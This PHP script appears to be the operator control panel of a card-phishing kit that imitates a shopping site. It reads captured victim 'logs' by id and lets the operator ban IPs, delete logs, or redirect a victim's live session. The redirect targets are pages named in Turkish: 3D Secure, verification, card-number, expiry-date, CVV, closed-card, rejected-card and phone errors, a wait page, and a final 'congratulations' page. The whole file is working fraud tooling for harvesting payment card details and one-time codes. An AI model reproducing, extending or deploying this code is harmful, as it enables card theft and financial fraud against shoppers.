<?php

// Check get request
$id = (int)htmlspecialchars(trim(strip_tags($_GET['id'])));
$type = htmlspecialchars(trim(strip_tags($_GET['type'])));

// Check if the id is empty
if (empty($id) or empty($type)) {
    header('Location: index.php');
    exit;
}

// Start the session
session_start();
ob_start();

// If the user is not logged in
if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}

// Include the database connection
include_once('../../inc/db.php');
$db = db_connect();

// Include the functions
include_once('../../inc/functions.php');

switch ($type) {
    case 'ban':
        // Get IP address from log id
        $query = $db->prepare('SELECT ipaddr FROM bella_bim_logs WHERE id = ?');
        try {
            $query->execute([$id]);
            $ip = $query->fetch(PDO::FETCH_OBJ);
            if ($ip) {
                // Check if the IP address is already banned
                $query = $db->prepare('DELETE FROM bella_bim_basket WHERE ip_address = ?');
                try {
                    $query->execute([$ip->ipaddr]);
                    $query = $db->prepare('INSERT INTO bella_bim_bans SET ipaddr = ?');
                    try {
                        $query->execute([$ip->ipaddr]);
                        $response = [
                            'status' => true,
                            'message' => 'IP adresi banlandı!'
                        ];
                        echo json_encode($response);
                        exit;
                    } catch (PDOException $e) {
                        $response = [
                            'status' => false,
                            'message' => $e->getMessage()
                        ];
                        echo json_encode($response);
                        exit;
                    }
                } catch (PDOException $e) {
                    $response = [
                        'status' => false,
                        'message' => $e->getMessage()
                    ];
                    echo json_encode($response);
                    exit;
                }
            } else {
                $response = [
                    'status' => false,
                    'message' => 'IP Adresi bulunamadı!'
                ];
                echo json_encode($response);
                exit;
            }
        } catch (PDOException $e) {
            $response = [
                'status' => false,
                'message' => $e->getMessage()
            ];
            echo json_encode($response);
            exit;
        }
        break;
    case 'delete':
        // Delete the log
        $query = $db->prepare('DELETE FROM bella_bim_logs WHERE id = ?');
        try {
            $query->execute([$id]);
            $response = [
                'status' => true,
                'message' => 'Log silindi!'
            ];
            echo json_encode($response);
            exit;
        } catch (PDOException $e) {
            $response = [
                'status' => false,
                'message' => $e->getMessage()
            ];
            echo json_encode($response);
            exit;
        }
        break;
    case '3dsecure':
        // Change the log status
        $query = $db->prepare('UPDATE logs SET status = 2 WHERE id = ?');
        try {
            $query->execute([$id]);
            $response = [
                'status' => true,
                'message' => '3D Secure şutlandı!'
            ];
            echo json_encode($response);
            exit;
        } catch (PDOException $e) {
            $response = [
                'status' => false,
                'message' => $e->getMessage()
            ];
            echo json_encode($response);
            exit;
        }
        break;
    case 'tebrik':
        $userIP = getUserIP();
        // Change the log status
        $query = $db->prepare('UPDATE logs SET status = 3 WHERE id = ?');
        try {
            $query->execute([$id]);
            unset($_SESSION['basket']);
            unset($_SESSION['basket_info']);
            // Delete basket from database
            $query = $db->prepare('DELETE FROM bella_bim_basket WHERE ip_address = ?');
            try {
                $query->execute([$userIP]);
                $response = [
                    'status' => true,
                    'message' => 'Tebriklendi!'
                ];
                echo json_encode($response);
                exit;
            } catch (PDOException $e) {
                $response = [
                    'status' => false,
                    'message' => $e->getMessage()
                ];
                echo json_encode($response);
                exit;
            }
        } catch (PDOException $e) {
            $response = [
                'status' => false,
                'message' => $e->getMessage()
            ];
            echo json_encode($response);
            exit;
        }
        break;
    case 'hatali':
        // Change the log status
        $query = $db->prepare('UPDATE logs SET status = 4 WHERE id = ?');
        try {
            $query->execute([$id]);
            $response = [
                'status' => true,
                'message' => 'Hatalıya yönlendirildi!'
            ];
            echo json_encode($response);
            exit;
        } catch (PDOException $e) {
            $response = [
                'status' => false,
                'message' => $e->getMessage()
            ];
            echo json_encode($response);
            exit;
        }
        break;
    case 'dogrulama':
        // Change the log status
        $query = $db->prepare('UPDATE logs SET status = 5 WHERE id = ?');
        try {
            $query->execute([$id]);
            $response = [
                'status' => true,
                'message' => 'Doğrulama sayfasına yönlendirildi!'
            ];
            echo json_encode($response);
            exit;
        } catch (PDOException $e) {
            $response = [
                'status' => false,
                'message' => $e->getMessage()
            ];
            echo json_encode($response);
            exit;
        }
        break;
    case 'ccno_error':
        // Change the log status
        $query = $db->prepare('UPDATE logs SET status = 6 WHERE id = ?');
        try {
            $query->execute([$id]);
            $response = [
                'status' => true,
                'message' => 'CCNO Hatasına yönlendirildi!'
            ];
            echo json_encode($response);
            exit;
        } catch (PDOException $e) {
            $response = [
                'status' => false,
                'message' => $e->getMessage()
            ];
            echo json_encode($response);
            exit;
        }
        break;
    case 'skt_error':
        // Change the log status
        $query = $db->prepare('UPDATE logs SET status = 7 WHERE id = ?');
        try {
            $query->execute([$id]);
            $response = [
                'status' => true,
                'message' => 'SKT Hatasına yönlendirildi!'
            ];
            echo json_encode($response);
            exit;
        } catch (PDOException $e) {
            $response = [
                'status' => false,
                'message' => $e->getMessage()
            ];
            echo json_encode($response);
            exit;
        }
        break;
    case 'cvv_error':
        // Change the log status
        $query = $db->prepare('UPDATE logs SET status = 8 WHERE id = ?');
        try {
            $query->execute([$id]);
            $response = [
                'status' => true,
                'message' => 'CVV Hatasına yönlendirildi!'
            ];
            echo json_encode($response);
            exit;
        } catch (PDOException $e) {
            $response = [
                'status' => false,
                'message' => $e->getMessage()
            ];
            echo json_encode($response);
            exit;
        }
        break;
    case 'closed_card':
        // Change the log status
        $query = $db->prepare('UPDATE logs SET status = 9 WHERE id = ?');
        try {
            $query->execute([$id]);
            $response = [
                'status' => true,
                'message' => 'Kapalı Kart Hatasına yönlendirildi!'
            ];
            echo json_encode($response);
            exit;
        } catch (PDOException $e) {
            $response = [
                'status' => false,
                'message' => $e->getMessage()
            ];
            echo json_encode($response);
            exit;
        }
        break;
    case 'red_card':
        // Change the log status
        $query = $db->prepare('UPDATE logs SET status = 10 WHERE id = ?');
        try {
            $query->execute([$id]);
            $response = [
                'status' => true,
                'message' => 'Red Kart Hatasına yönlendirildi!'
            ];
            echo json_encode($response);
            exit;
        } catch (PDOException $e) {
            $response = [
                'status' => false,
                'message' => $e->getMessage()
            ];
            echo json_encode($response);
            exit;
        }
        break;
    case 'phone_error':
        // Change the log status
        $query = $db->prepare('UPDATE logs SET status = 11 WHERE id = ?');
        try {
            $query->execute([$id]);
            $response = [
                'status' => true,
                'message' => 'Telefon hatalıya yönlendirildi!'
            ];
            echo json_encode($response);
            exit;
        } catch (PDOException $e) {
            $response = [
                'status' => false,
                'message' => $e->getMessage()
            ];
            echo json_encode($response);
            exit;
        }
        break;
    case 'bekle':
        // Change the log status
        $query = $db->prepare('UPDATE logs SET status = 12 WHERE id = ?');
        try {
            $query->execute([$id]);
            $response = [
                'status' => true,
                'message' => 'Bekleye yönlendirildi!'
            ];
            echo json_encode($response);
            exit;
        } catch (PDOException $e) {
            $response = [
                'status' => false,
                'message' => $e->getMessage()
            ];
            echo json_encode($response);
            exit;
        }
        break;
    default:
        $response = [
            'status' => false,
            'message' => 'Geçersiz işlem!'
        ];
        echo json_encode($response);
        exit;
        break;
}